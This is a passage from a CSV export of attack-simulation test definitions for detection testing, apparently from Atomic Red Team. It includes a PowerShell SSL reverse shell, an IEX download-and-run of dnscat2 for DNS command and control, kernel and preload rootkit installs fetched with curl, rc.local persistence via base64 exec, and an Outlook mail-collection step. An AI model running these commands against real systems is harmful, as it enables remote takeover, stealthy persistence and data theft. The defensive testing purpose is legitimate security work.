[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local
echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\"""" | sudo tee -a /etc/rc.local
printf 'exit 0' | sudo tee -a /etc/rc.local
sudo chmod +x /etc/rc.local
",sh,True,,"origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi
",,,
T1091,Replication Through Removable Media,USB Malware Spread Simulation,d44b7297-622c-4be8-ad88-ec40d7563c75,"Simulates an adversary copying malware to all connected removable drives. 
",windows,,,"$RemovableDrives=@()
$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID
ForEach ($Drive in $RemovableDrives)
{
write-host ""Removable Drive Found:"" $Drive
New-Item -Path $Drive/T1091Test1.txt -ItemType ""file"" -Force -Value ""T1091 Test 1 has created this file to simulate malware spread to removable drives.""
}
",powershell,,,"$RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter ""drivetype=2"" | select-object -expandproperty DeviceID
ForEach ($Drive in $RemovableDrives)
{
Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
}
",,,
T1124,System Time Discovery,System Time Discovery,20aba24b-e61f-4b26-b4ce-4784f763ca20,"Identify the system time. Upon execution, the local computer system time and timezone will be displayed.
",windows,,,"net time \\#{computer_name}
w32tm /tz
",command_prompt,,,,,,"input_arguments.computer_name.description: computer name to query

input_arguments.computer_name.type: string

input_arguments.computer_name.default: localhost

"
T1124,System Time Discovery,System Time Discovery - PowerShell,1d5711d6-655c-4a47-ae9c-6503c74fa877,"Identify the system time via PowerShell. Upon execution, the system time will be displayed.
",windows,,,"Get-Date
",powershell,,,,,,
T1124,System Time Discovery,System Time Discovery in FreeBSD/macOS,f449c933-0891-407f-821e-7916a21a1a6f,"Identify system time. Upon execution, the local computer system time and timezone will be displayed. 
",linux,macos,,"date
",sh,,,,,,
T1124,System Time Discovery,System Time Discovery W32tm as a Delay,d5d5a6b0-0f92-42d8-985d-47aafa2dd4db,"identifies DCRat delay time tactics using w32tm.
https://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/
https://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains
",windows,,,"W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2
",command_prompt,,,,,,
T1124,System Time Discovery,System Time with Windows time Command,53ead5db-7098-4111-bb3f-563be390e72e,"Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time
Recently observed in use in the wild during an incident involving Ursnif malware:
https://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml
https://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/
",windows,,,"time
",command_prompt,,,,,,
T1571,Non-Standard Port,Testing usage of uncommonly used port with PowerShell,21fe622f-8e53-4b31-ba83-6d333c2583f4,"Testing uncommonly used port utilizing PowerShell. APT33 has been known to attempt telnet over port 8081. Upon execution, details about the successful
port check will be displayed.
",windows,,,"Test-NetConnection -ComputerName #{domain} -port #{port}
",powershell,,,,,,"input_arguments.port.description: Specify uncommon port number

input_arguments.port.type: string

input_arguments.port.default: 8081

input_arguments.domain.description: Specify target hostname

input_arguments.domain.type: string

input_arguments.domain.default: google.com

"
T1571,Non-Standard Port,Testing usage of uncommonly used port,5db21e1d-dd9c-4a50-b885-b1e748912767,"Testing uncommonly used port utilizing telnet.
",linux,macos,,"echo quit | telnet #{domain} #{port}
exit 0
",sh,,,,sh,"dependencies.0.description: Requires telnet

dependencies.0.prereq_command: which telnet

dependencies.0.get_prereq_command: echo ""please install telnet to run this test""; exit 1

","input_arguments.port.description: Specify uncommon port number

input_arguments.port.type: string

input_arguments.port.default: 8081

input_arguments.domain.description: Specify target hostname

input_arguments.domain.type: string

input_arguments.domain.default: google.com

"
T1114.001,Email Collection: Local Email Collection,Email Collection with PowerShell Get-Inbox,3f1b5096-0139-4736-9b78-19bcb02bb1cb,"Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.
Successful execution will produce stdout message stating ""Please be patient, this may take some time..."". Upon completion, final output will be a mail.csv file.

Note: Outlook is required, but no email account necessary to produce artifacts.
",windows,,,"powershell -executionpolicy bypass -command ""#{file_path}\Get-Inbox.ps1"" -file #{output_file}
",powershell,,,"Remove-Item #{output_file} -Force -ErrorAction Ignore
",powershell,"dependencies.0.description: Get-Inbox.ps1 must be located at #{file_path}

dependencies.0.prereq_command: if (Test-Path ""#{file_path}\Get-Inbox.ps1"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1114.001/src/Get-Inbox.ps1"" -OutFile ""#{file_path}\Get-Inbox.ps1""

","input_arguments.output_file.description: Output file path

input_arguments.output_file.type: string

input_arguments.output_file.default: $env:TEMP\mail.csv

input_arguments.file_path.description: File path for Get-Inbox.ps1

input_arguments.file_path.type: string

input_arguments.file_path.default: PathToAtomicsFolder\T1114.001\src

"
T1573,Encrypted Channel,OpenSSL C2,21caf58e-87ad-440c-a6b8-3ac259964003,"Thanks to @OrOneEqualsOne for this quick C2 method.
This is to test to see if a C2 session can be established using an SSL socket.
More information about this technique, including how to set up the listener, can be found here:
https://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926

Upon successful execution, powershell will make a network connection to 127.0.0.1 over 443.
",windows,,,"$server_ip = #{server_ip}
$server_port = #{server_port}
$socket = New-Object Net.Sockets.TcpClient('#{server_ip}', '#{server_port}')
$stream = $socket.GetStream()
$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
$sslStream.AuthenticateAsClient('fakedomain.example', $null, ""Tls12"", $false)
$writer = new-object System.IO.StreamWriter($sslStream)
$writer.Write('PS ' + (pwd).Path + '> ')
$writer.flush()
[byte[]]$bytes = 0..65535|%{0};
while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
$sendback = (iex $data | Out-String ) 2>&1;
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
",powershell,,,,,,"input_arguments.server_ip.description: IP of the external server

input_arguments.server_ip.type: string

input_arguments.server_ip.default: 127.0.0.1

input_arguments.server_port.description: The port to connect to on the external server

input_arguments.server_port.type: string

input_arguments.server_port.default: 443

"
T1505.005,Server Software Component: Terminal Services DLL,Simulate Patching termsrv.dll,0b2eadeb-4a64-4449-9d43-3d999f4a317b,"Simulates patching of termsrv.dll by making a benign change to the file and replacing it with the original afterwards.
Before we can make the modifications we need to take ownership of the file and grant ourselves the necessary permissions.
",windows,,,"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore
Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore
Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore
",powershell,True,,"Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore
",,,
T1505.005,Server Software Component: Terminal Services DLL,Modify Terminal Services DLL Path,18136e38-0530-49b2-b309-eed173787471,This atomic test simulates the modification of the ServiceDll value in HKLM\System\CurrentControlSet\services\TermService\Parameters. This technique may be leveraged by adversaries to establish persistence by loading a patched version of the DLL containing malicious code.,windows,,,"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path $termsrvDll -Destination ""$HOME\AtomicTest.dll""

$newServiceDll = ""$HOME\AtomicTest.dll""

$registryPath = ""HKLM:\System\CurrentControlSet\services\TermService\Parameters""

# Check if the registry key exists
if (Test-Path -Path $registryPath) {
    # Modify the ServiceDll value in the registry
    Set-ItemProperty -Path $registryPath -Name ""ServiceDll"" -Value $newServiceDll
    Write-Host ""ServiceDll value in the registry has been updated to: $newServiceDll""
} else {
    Write-Host ""Registry key not found. Make sure the 'TermService\Parameters' key exists.""
}",powershell,True,,"Set-ItemProperty -Path ""HKLM:\System\CurrentControlSet\services\TermService\Parameters"" -Name ""ServiceDll"" -Value ""C:\Windows\System32\termsrv.dll""",,,
T1564.003,Hide Artifacts: Hidden Window,Hidden Window,f151ee37-9e2b-47e6-80e4-550b9f999b7a,"Launch PowerShell with the ""-WindowStyle Hidden"" argument to conceal PowerShell windows by setting the WindowStyle parameter to hidden.
Upon execution a hidden PowerShell window will launch calc.exe
",windows,,,"Start-Process #{powershell_command}
",powershell,,,,,,"input_arguments.powershell_command.description: Command to launch calc.exe from a hidden PowerShell Window

input_arguments.powershell_command.type: string

input_arguments.powershell_command.default: powershell.exe -WindowStyle hidden calc.exe

"
T1564.003,Hide Artifacts: Hidden Window,Headless Browser Accessing Mockbin,0ad9ab92-c48c-4f08-9b20-9633277c4646,"The following Atomic Red Team test leverages the Chrome headless browser to access a mockbin site. Create your own Mockbin.org site and replace the BIN in the inputs.
The default Mockbin ID forwards to google.com and you may view the details here https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec/view.
Reference: https://cert.gov.ua/article/5702579
",windows,,,"start """" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}
",command_prompt,,,"taskkill /im #{browser} /f
",,,"input_arguments.bin_id.description: Mockbin.org BIN ID

input_arguments.bin_id.type: string

input_arguments.bin_id.default: f6b9a876-a826-4ac0-83b8-639d6ad516ec

input_arguments.browser.description: Browser to use (msedge, chrome, firefox)

input_arguments.browser.type: string

input_arguments.browser.default: chrome

"
T1071.004,Application Layer Protocol: DNS,DNS Large Query Volume,1700f5d6-5a44-487b-84de-bc66f507b0a6,"This test simulates an infected host sending a large volume of DNS queries to a command and control server.
The intent of this test is to trigger threshold based detection on the number of DNS queries either from a single source system or to a single targe domain.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
",windows,,,"for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type ""#{query_type}"" ""#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}"" -QuickTimeout}
",powershell,,,,,,"input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.subdomain.description: Subdomain prepended to the domain name

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteam

input_arguments.query_volume.description: Number of DNS queries to send

input_arguments.query_volume.type: integer

input_arguments.query_volume.default: 1000

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.nip.io

"
T1071.004,Application Layer Protocol: DNS,DNS Regular Beaconing,3efc144e-1af8-46bb-8ca2-1376bb6db8b6,"This test simulates an infected host beaconing via DNS queries to a command and control server at regular intervals over time.
This behaviour is typical of implants either in an idle state waiting for instructions or configured to use a low query volume over time to evade threshold based detection.
A custom domain and sub-domain will need to be passed as input parameters for this test to work. Upon execution, DNS information about the domain will be displayed for each callout.
",windows,,,"Set-Location ""PathToAtomicsFolder""
.\T1071.004\src\T1071-dns-beacon.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}
",powershell,,,,,,"input_arguments.runtime.description: Time in minutes to run the simulation

input_arguments.runtime.type: integer

input_arguments.runtime.default: 30

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.nip.io

input_arguments.subdomain.description: Subdomain prepended to the domain name

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteam

input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.c2_interval.description: Seconds between C2 requests to the command and control server

input_arguments.c2_interval.type: integer

input_arguments.c2_interval.default: 30

input_arguments.c2_jitter.description: Percentage of jitter to add to the C2 interval to create variance in the times between C2 requests

input_arguments.c2_jitter.type: integer

input_arguments.c2_jitter.default: 20

"
T1071.004,Application Layer Protocol: DNS,DNS Long Domain Query,fef31710-223a-40ee-8462-a396d6b66978,"This test simulates an infected host returning data to a command and control server using long domain names.
The simulation involves sending DNS queries that gradually increase in length until reaching the maximum length. The intent is to test the effectiveness of detection of DNS queries for long domain names over a set threshold.
 Upon execution, DNS information about the domain will be displayed for each callout.
",windows,,,"Set-Location ""PathToAtomicsFolder""
.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
",powershell,,,,,,"input_arguments.query_type.description: DNS query type

input_arguments.query_type.type: string

input_arguments.query_type.default: TXT

input_arguments.subdomain.description: Subdomain prepended to the domain name (should be 63 characters to test maximum length)

input_arguments.subdomain.type: string

input_arguments.subdomain.default: atomicredteamatomicredteamatomicredteamatomicredteamatomicredte

input_arguments.domain.description: Default domain to simulate against

input_arguments.domain.type: string

input_arguments.domain.default: 127.0.0.1.nip.io

"
T1071.004,Application Layer Protocol: DNS,DNS C2,e7bf9802-2e78-4db9-93b5-181b7bcd37d7,"This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
The following blogs have more information.

https://github.com/iagox86/dnscat2

https://github.com/lukebaggett/dnscat2-powershell
",windows,,,"IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
",powershell,,,,,,"input_arguments.domain.description: Domain Name configured to use DNS Server where your C2 listener is running

input_arguments.domain.type: string

input_arguments.domain.default: example.com

input_arguments.server_ip.description: IP address of DNS server where your C2 listener is running

input_arguments.server_ip.type: string

input_arguments.server_ip.default: 127.0.0.1

"
T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Shortcut Modification,ce4fc678-364f-4282-af16-2fb4c78005ce,"This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;
gci -path ""C:\Users"" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern ""exe"" | FL.
Upon execution, calc.exe will be launched.
",windows,,,"echo [InternetShortcut] > #{shortcut_file_path}
echo URL=C:\windows\system32\calc.exe >> #{shortcut_file_path}
#{shortcut_file_path}
",command_prompt,,,"del -f #{shortcut_file_path} >nul 2>&1
",,,"input_arguments.shortcut_file_path.description: shortcut modified and execute

input_arguments.shortcut_file_path.type: path

input_arguments.shortcut_file_path.default: %temp%\T1547.009_modified_shortcut.url

"
T1547.009,Boot or Logon Autostart Execution: Shortcut Modification,Create shortcut to cmd in startup folders,cfdc954d-4bb0-4027-875b-a1893ce406f2,"LNK file to launch CMD placed in startup folder. Upon execution, open File Explorer and browse to ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""
to view the new shortcut.
",windows,,,"$Shell = New-Object -ComObject (""WScript.Shell"")
$ShortCut = $Shell.CreateShortcut(""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"")
$ShortCut.TargetPath=""cmd.exe""
$ShortCut.WorkingDirectory = ""C:\Windows\System32"";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = ""T1547.009."";
$ShortCut.Save()

$Shell = New-Object -ComObject (""WScript.Shell"")
$ShortCut = $Shell.CreateShortcut(""$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"")
$ShortCut.TargetPath=""cmd.exe""
$ShortCut.WorkingDirectory = ""C:\Windows\System32"";
$ShortCut.WindowStyle = 1;
$ShortCut.Description = ""T1547.009."";
$ShortCut.Save()
",powershell,True,,"Remove-Item ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"" -ErrorAction Ignore
Remove-Item ""$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\T1547.009.lnk"" -ErrorAction Ignore
",,,
T1505.004,IIS Components,Install IIS Module using AppCmd.exe,53adbdfa-8200-490c-871c-d3b1ab3324b2,"The following Atomic will utilize AppCmd.exe to install a new IIS Module. IIS must be installed.
This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).
A successful execution will install a module into IIS using AppCmd.exe.
[Managing and installing Modules Reference](https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview#to-install-a-module-using-appcmdexe)
[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)
",windows,,,"%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
",command_prompt,,,"%windir%\system32\inetsrv\appcmd.exe uninstall module #{module_name}
",powershell,"dependencies.0.description: IIS must be installed in order to add a module to IIS.

dependencies.0.prereq_command: $service = get-service w3svc -ErrorAction SilentlyContinue
if($service){ Write-Host ""IIS installed on $env:computername"" } else { Write-Host ""IIS is not installed on $env:computername"" } 

dependencies.0.get_prereq_command: Install IIS to continue.

","input_arguments.module_name.description: The name of the IIS module

input_arguments.module_name.type: string

input_arguments.module_name.default: DefaultDocumentModule_Atomic

input_arguments.dll_path.description: The path to the DLL to be loaded

input_arguments.dll_path.type: path

input_arguments.dll_path.default: %windir%\system32\inetsrv\defdoc.dll

"
T1505.004,IIS Components,Install IIS Module using PowerShell Cmdlet New-WebGlobalModule,cc3381fb-4bd0-405c-a8e4-6cacfac3b06c,"The following Atomic will utilize PowerShell Cmdlet New-WebGlobalModule to install a new IIS Module. IIS must be installed.
This atomic utilizes a DLL on disk, but to test further suspiciousness, compile and load [IIS-Raid](https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-modules/).
A successful execution will install a module into IIS using New-WebGlobalModule.
[Managing IIS Modules with PowerShell](https://learn.microsoft.com/en-us/powershell/module/webadministration/set-webglobalmodule?view=windowsserver2022-ps)
[IIS Modules](https://www.microsoft.com/en-us/security/blog/2022/12/12/iis-modules-the-evolution-of-web-shells-and-how-to-detect-them/)
",windows,,,"New-WebGlobalModule -Name #{module_name} -Image #{dll_path}
",powershell,,,"Remove-WebGlobalModule -Name #{module_name}
",powershell,"dependencies.0.description: IIS must be installed in order to add a module to IIS.

dependencies.0.prereq_command: $service = get-service w3svc -ErrorAction SilentlyContinue
if($service){ Write-Host ""IIS installed on $env:computername"" } else { Write-Host ""IIS is not installed on $env:computername"" } 

dependencies.0.get_prereq_command: Install IIS to continue.

","input_arguments.module_name.description: The name of the IIS module

input_arguments.module_name.type: string

input_arguments.module_name.default: DefaultDocumentModule_Atomic

input_arguments.dll_path.description: The path to the DLL to be loaded

input_arguments.dll_path.type: path

input_arguments.dll_path.default: %windir%\system32\inetsrv\defdoc.dll

"
T1014,Rootkit,Loadable Kernel Module based Rootkit,dfb50072-e45a-4c75-a17e-a484809c8553,"Loadable Kernel Module based Rootkit
",linux,,,"sudo insmod #{rootkit_path}/#{rootkit_name}.ko
",sh,True,,"sudo rmmod #{rootkit_name}
sudo rm -rf #{rootkit_path}
",bash,"dependencies.0.description: The kernel module must exist on disk at specified location (#{rootkit_path}/#{rootkit_name}.ko)

dependencies.0.prereq_command: if [ -f #{rootkit_path}/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; fi;
cp #{rootkit_source_path}/* /tmp/T1014/
cd /tmp/T1014; make
mkdir #{rootkit_path}
mv /tmp/T1014/#{rootkit_name}.ko #{rootkit_path}/#{rootkit_name}.ko
rm -rf /tmp/T1014

","input_arguments.rootkit_source_path.description: Path to the rootkit source. Used when prerequisites are fetched.

input_arguments.rootkit_source_path.type: path

input_arguments.rootkit_source_path.default: PathToAtomicsFolder/T1014/src/Linux

input_arguments.rootkit_path.description: Path To rootkit

input_arguments.rootkit_path.type: string

input_arguments.rootkit_path.default: PathToAtomicsFolder/T1014/bin

input_arguments.rootkit_name.description: Module name

input_arguments.rootkit_name.type: string

input_arguments.rootkit_name.default: T1014

"
T1014,Rootkit,Loadable Kernel Module based Rootkit,75483ef8-f10f-444a-bf02-62eb0e48db6f,"Loadable Kernel Module based Rootkit
",linux,,,"sudo modprobe #{rootkit_name}
",sh,True,,"sudo modprobe -r #{rootkit_name}
sudo rm /lib/modules/$(uname -r)/#{rootkit_name}.ko
sudo depmod -a
",bash,"dependencies.0.description: The kernel module must exist on disk at specified location (#{rootkit_source_path}/#{rootkit_name}.ko)

dependencies.0.prereq_command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: sudo apt install make
sudo apt install gcc
if [ ! -d /tmp/T1014 ]; then mkdir /tmp/T1014; touch /tmp/T1014/safe_to_delete; fi;
cp #{rootkit_source_path}/* /tmp/T1014
cd /tmp/T1014; make        
sudo cp /tmp/T1014/#{rootkit_name}.ko /lib/modules/$(uname -r)/
[ -f /tmp/T1014/safe_to_delete ] && rm -rf /tmp/T1014
sudo depmod -a

","input_arguments.rootkit_source_path.description: Path to the rootkit source. Used when prerequisites are fetched.

input_arguments.rootkit_source_path.type: path

input_arguments.rootkit_source_path.default: PathToAtomicsFolder/T1014/src/Linux

input_arguments.rootkit_name.description: Module name

input_arguments.rootkit_name.type: string

input_arguments.rootkit_name.default: T1014

"
T1014,Rootkit,dynamic-linker based rootkit (libprocesshider),1338bf0c-fd0c-48c0-9e65-329f18e2c0d3,"Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).
",linux,,,"echo #{library_path} | tee -a /etc/ld.so.preload
/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo ""process hidden""
",sh,True,,"sed -i ""\:^#{library_path}:d"" /etc/ld.so.preload
rm -rf #{library_path} /usr/local/bin/evil_script.py /tmp/atomic
",bash,"dependencies.0.description: The preload library must exist on disk at specified location (#{library_path})

dependencies.0.prereq_command: if [ -f #{library_path} ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd libprocesshider-#{rev}
make
cp libprocesshider.so #{library_path}
cp /usr/bin/ping /usr/local/bin/evil_script.py

","input_arguments.repo.description: Url of the github repo zip

input_arguments.repo.type: string

input_arguments.repo.default: https://github.com/gianlucaborello/libprocesshider/

input_arguments.rev.description: Revision of the github repo zip

input_arguments.rev.type: string

input_arguments.rev.default: 25e0587d6bf2137f8792dc83242b6b0e5a72b415

input_arguments.library_path.description: Full path of the library to add to ld.so.preload

input_arguments.library_path.type: string

input_arguments.library_path.default: /usr/local/lib/libprocesshider.so

"
T1014,Rootkit,Loadable Kernel Module based Rootkit (Diamorphine),0b996469-48c6-46e2-8155-a17f8b6c2247,"Loads Diamorphine kernel module, which hides itself and a processes.
",linux,,,"sudo modprobe #{rootkit_name}
ping -c 10 localhost >/dev/null & TARGETPID=""$!""
ps $TARGETPID
kill -31 $TARGETPID
ps $TARGETPID || echo ""process ${TARGETPID} hidden""
",sh,True,,"kill -63 1
sudo modprobe -r #{rootkit_name}
sudo rm -rf /lib/modules/$(uname -r)/#{rootkit_name}.ko /tmp/atomic
sudo depmod -a
",bash,"dependencies.0.description: The kernel module must exist on disk at specified location (#{rootkit_name}.ko)

dependencies.0.prereq_command: if [ -f /lib/modules/$(uname -r)/#{rootkit_name}.ko ]; then exit 0; else exit 1; fi;

dependencies.0.get_prereq_command: mkdir -p /tmp/atomic && cd /tmp/atomic
curl -sLO #{repo}/archive/#{rev}.zip && unzip #{rev}.zip && cd Diamorphine-#{rev}
make
sudo cp #{rootkit_name}.ko /lib/modules/$(uname -r)/
sudo depmod -a

","input_arguments.repo.description: Url of the diamorphine github repo

input_arguments.repo.type: string

input_arguments.repo.default: https://github.com/m0nad/Diamorphine/

input_arguments.rev.description: Revision of the github repo zip

input_arguments.rev.type: string

input_arguments.rev.default: 898810523aa2033f582a4a5903ffe453334044f9

input_arguments.rootkit_name.description: Module name

input_arguments.rootkit_name.type: string

input_arguments.rootkit_name.default: diamorphine

"
T1505.002,Server Software Component: Transport Agent,Install MS Exchange Transport Agent Persistence,43e92449-ff60-46e9-83a3-1a38089df94d,"Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.
More details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help
",windows,,,"Install-TransportAgent -Name #{transport_agent_identity} -TransportAgentFactory #{class_factory} -AssemblyPath #{dll_path}
Enable-TransportAgent #{transport_agent_identity}
Get-TransportAgent | Format-List Name,Enabled
",powershell,True,,"if(Get-Command ""Get-TransportAgent"" -ErrorAction Ignore){
  Disable-TransportAgent #{transport_agent_identity}
  Uninstall-TransportAgent #{transport_agent_identity}
  Get-TransportAgent
}
",,"dependencies.0.description: Microsoft Exchange SnapIn must be installed

dependencies.0.prereq_command: Get-TransportAgent -TransportService FrontEnd

dependencies.0.get_prereq_command: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn

","input_arguments.class_factory.description: Class factory of transport agent.

input_arguments.class_factory.type: string

input_arguments.class_factory.default: Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory

input_arguments.dll_path.description: Path of DLL to use as transport agent.

input_arguments.dll_path.type: path

input_arguments.dll_path.default: c:\program files\microsoft\Exchange Server\v15\bin\Microsoft.Exchange.Security.Interop.dll

input_arguments.transport_agent_identity.description: Friendly name of transport agent once installed.

input_arguments.transport_agent_identity.type: string

input_arguments.transport_agent_identity.default: Security Interop Agent

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Make and modify binary from C source,896dfe97-ae43-4101-8e96-9a7996555d80,"Make, change owner, and change file attributes on a C source code file
",macos,linux,,"cp #{payload} /tmp/hello.c
sudo chown root /tmp/hello.c
sudo make /tmp/hello
sudo chown root /tmp/hello
sudo chmod u+s /tmp/hello
/tmp/hello
",sh,True,,"sudo rm /tmp/hello
sudo rm /tmp/hello.c
",,,"input_arguments.payload.description: hello.c payload

input_arguments.payload.type: path

input_arguments.payload.default: PathToAtomicsFolder/T1548.001/src/hello.c

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Make and modify binary from C source (freebsd),dd580455-d84b-481b-b8b0-ac96f3b1dc4c,"Make, change owner, and change file attributes on a C source code file
",linux,,,"cp #{payload} /tmp/hello.c
chown root /tmp/hello.c
make /tmp/hello
chown root /tmp/hello
chmod u+s /tmp/hello
/tmp/hello
",sh,True,,"rm /tmp/hello
rm /tmp/hello.c
",,,"input_arguments.payload.description: hello.c payload

input_arguments.payload.type: path

input_arguments.payload.default: PathToAtomicsFolder/T1548.001/src/hello.c

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetUID flag on file,759055b3-3885-4582-a8ec-c00c9d64dd79,"This test sets the SetUID flag on a file in FreeBSD.
",macos,linux,,"sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod u+xs #{file_to_setuid}
",sh,True,,"sudo rm #{file_to_setuid}
",,,"input_arguments.file_to_setuid.description: Path of file to set SetUID flag

input_arguments.file_to_setuid.type: path

input_arguments.file_to_setuid.default: /tmp/evilBinary

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetUID flag on file (freebsd),9be9b827-ff47-4e1b-bef8-217db6fb7283,"This test sets the SetUID flag on a file in FreeBSD.
",linux,,,"touch #{file_to_setuid}
chown root #{file_to_setuid}
chmod u+xs #{file_to_setuid}
",sh,True,,"rm #{file_to_setuid}
",,,"input_arguments.file_to_setuid.description: Path of file to set SetUID flag

input_arguments.file_to_setuid.type: path

input_arguments.file_to_setuid.default: /tmp/evilBinary

"
T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Set a SetGID flag on file,db55f666-7cba-46c6-9fe6-205a05c3242c,"This test sets the SetGID flag on a file in Linux and macOS.
",macos,linux,,"sudo touch #{file_to_setuid}
sudo chown root #{file_to_setuid}
sudo chmod g+xs #{file_to_setuid}
",sh,True,,"sudo rm #{file_to_setuid}
